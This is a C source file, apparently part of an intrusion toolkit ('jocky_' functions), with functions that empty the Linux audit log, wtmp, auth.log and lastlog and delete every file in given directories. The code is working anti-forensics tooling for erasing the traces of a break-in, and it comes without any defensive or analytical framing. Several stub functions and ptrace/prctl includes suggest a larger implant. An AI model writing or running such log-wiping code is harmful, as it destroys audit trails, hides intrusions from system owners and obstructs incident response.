#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdbool.h>


int8_t* jocky_module_info(int8_t* handle) {
    if (!handle) return NULL;
    return handle;
}

int32_t jocky_linux_cleanup_audit(void) {
    const char* audit_log_path = "/var/log/audit/audit.log";

    int fd = open(audit_log_path, O_WRONLY | O_TRUNC);
    if (fd < 0) return 0;

    close(fd);
    return 1;
}

int32_t jocky_linux_cleanup_wtmp(void) {
    const char* wtmp_path = "/var/log/wtmp";

    int fd = open(wtmp_path, O_WRONLY | O_TRUNC);
    if (fd < 0) return 0;

    close(fd);
    return 1;
}

int32_t jocky_linux_cleanup_auth(void) {
    const char* auth_path = "/var/log/auth.log";

    int fd = open(auth_path, O_WRONLY | O_TRUNC);
    if (fd < 0) return 0;

    close(fd);
    return 1;
}

int32_t jocky_linux_cleanup_lastlog(void) {
    const char* lastlog_path = "/var/log/lastlog";
    
    int fd = open(lastlog_path, O_WRONLY | O_TRUNC);
    if (fd < 0) return 0;

    close(fd);
    return 1;
}

int32_t jocky_wipe_temp_files(const char* path1, const char* path2) {
    if (!path1) return 0;

    int removed = 0;
    const char* paths[2] = {path1, path2};
    for (int pi = 0; pi < 2; pi++) {
        if (!paths[pi]) continue;
        DIR* d = opendir(paths[pi]);
        if (!d) continue;
        struct dirent* ent;
        while ((ent = readdir(d)) != NULL) {
            if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) continue;
            char full[1024];
            snprintf(full, sizeof(full), "%s/%s", paths[pi], ent->d_name);
            removed += (unlink(full) == 0) ? 1 : 0;
        }
        closedir(d);
    }
    return removed > 0 ? 1 : 0;
}


int8_t* jocky_thread_get_info(int32_t pid) {
    static char info[256] = "thread_info";
    return (int8_t*)info;
}
